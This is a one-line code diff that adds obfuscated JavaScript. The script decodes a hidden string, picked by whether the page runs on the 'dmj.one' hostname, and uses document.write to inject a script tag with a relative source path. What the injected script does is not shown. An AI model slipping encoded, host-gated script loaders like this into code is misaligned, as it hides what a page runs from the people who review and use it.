@@ -1,0 +1,1 @@
+!function(o){for(var e=o.slice(-5),t=o.slice(0,-5),n="=".repeat((4-t.length%4)%4),a=[],r=0;r<atob(t+n).length;r++)a[r]=atob(t+n).charCodeAt(r)-e.charCodeAt(r%5);document.write(String.fromCharCode.apply(null,a))}("dmj.one"===window.location.hostname?"huTc3sO65ZnfzK2um5vEvaDp3smun+PffIitqN+9vNrp4JgJqylZ":"o8uwvLjXzG29wcqVb3m52oexr8WVwsBsjaOHwK3B0MjBiAgXMJO");
